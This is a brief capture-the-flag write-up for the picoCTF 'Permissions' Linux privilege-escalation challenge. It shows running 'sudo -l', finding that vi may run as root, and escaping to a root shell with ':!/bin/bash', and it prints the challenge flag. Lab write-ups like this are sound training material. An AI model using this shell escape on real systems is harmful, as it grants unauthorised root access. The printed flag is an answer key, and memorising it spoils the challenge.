---
title: "Permissions"
pubDate: 2025-12-24
description: "linux priv escalation chal"
ctfName: "picoCTF"
draft: false
tags: ["linux", "priv-escalation", "picoCTF"]
---
# Problem
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
# Solution
list the commands that i'm able to run as root
```bash
sudo -l
```

looks like i can run the [vi text editor](https://gtfobins.github.io/gtfobins/vi/)
```bash
sudo vi test
```

`esc` to run commands, spawn a root shell with
```bash
:!/bin/bash
```

go to root shell and get flag.

Flag: ```picoCTF{uS1ng_v1m_3dit0r_55878b51}```
